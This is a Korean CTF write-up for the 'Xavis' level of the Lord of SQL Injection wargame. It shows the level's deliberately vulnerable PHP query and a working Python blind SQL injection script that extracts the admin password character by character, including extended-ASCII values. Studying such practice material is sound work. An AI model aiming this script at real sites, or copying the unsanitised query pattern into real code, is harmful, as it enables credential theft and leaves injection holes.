---
layout: default
title: Xavis
parent: Load Of SQL Injection
nav_order: 19
---

# Xavis

평범한 Blind SQL Injection 문제지만, pw값이 아스키코드 범위에서 나오지 않는다.

보통 사용하는 영문자와 숫자만이 포함된 아스키코드에서 더 확장된 아스키코드 범위에서 pw가 나오기 때문에 Blind SQL Injection을 진행할 때 아스키코드의 범위를 늘려주면 풀 수 있다.

```php
<?php 
  include "./config.php"; 
  login_chk(); 
  dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");
  if(preg_match('/regex|like/i', $_GET[pw])) exit("HeHe"); 
  $query = "select id from prob_xavis where id='admin' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
   
  $_GET[pw] = addslashes($_GET[pw]); 
  $query = "select pw from prob_xavis where id='admin' and pw='{$_GET[pw]}'"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("xavis"); 
  highlight_file(__FILE__); 
?>
```
Python 툴을 짜 해결할 수 있다.

```python
#-*-coding:utf-8-*-
import urllib, urllib2, cookielib, re, ssl
key=''
length=0
cj = cookielib.CookieJar()
opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
opener.addheaders={('User-agent','Mozila/5.0(compatible;MSIE 5.5;Windows NT)')}

loginUrl2='https://los.eagle-jump.org/?login'
login_form={"id":"los_id","pw":"los_pw"}
login_form=urllib.urlencode(login_form)
reqLogin = opener.open('https://los.eagle-jump.org/?login',login_form)
url = 'https://los.eagle-jump.org/gate.php'
req=opener.open(url)

print 'start Blind SQL Injection'
print "search key's length"
while 1:
    length=length+1
    url = "https://los.eagle-jump.org/xavis_fd4389515d6540477114ec3c79623afe.php?pw='or length(pw)=%d;%%00"%(length)
    print url
    resp=opener.open(url)
    rresp=resp.read()
    find=re.findall("Hello admin",rresp)
    if find:
        break
print length

print 'search key.'
lenck=1
while 1:
    subkey = -1
    for x in range(225):
        subkey=subkey+1
        hexkey=hex(subkey);
	if subkey==1:
		subkey=subkey+127
		hexkey=hex(subkey)
	if hexkey=="0x25":
		subkey=subkey+1
		hexkey=hex(subkey)
        url="https://los.eagle-jump.org/xavis_fd4389515d6540477114ec3c79623afe.php?pw='or ord(substr(pw,%d,1))=%d;%%00" %(lenck,subkey)
        print url
        resp=opener.open(url)
        rresp=resp.read()
        find=re.findall("Hello admin",rresp)
        if find:
            if hexkey=="0x0":
                print 'find key'
                print key
                exit()
            print 'find'
            key=key+hexkey
            break
    lenck=lenck+1
    if lenck-1==length:
        break
```